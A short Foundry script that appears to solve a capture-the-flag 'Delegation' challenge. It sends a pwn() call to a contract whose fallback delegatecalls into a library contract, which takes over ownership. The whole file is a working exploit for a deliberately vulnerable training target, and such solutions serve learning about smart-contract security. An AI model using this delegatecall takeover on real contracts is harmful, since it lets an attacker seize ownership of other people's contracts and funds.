// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Delegation, Delegate} from "../src/Delegation.sol";

contract SolveDelegation is Script {
    Delegation public delegation;
    Delegate public delegate;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        delegation = Delegation(vm.envAddress("DELEGATION_ADDRESS"));
        // Craft the calldata to call the pwn() function in the Delegate contract
        bytes memory data = abi.encodeWithSignature("pwn()");
        // Call the fallback function of the Delegation contract with the crafted calldata
        (bool success,) = address(delegation).call(data);
        require(success, "Delegatecall failed");
        vm.stopBroadcast();
    }
}
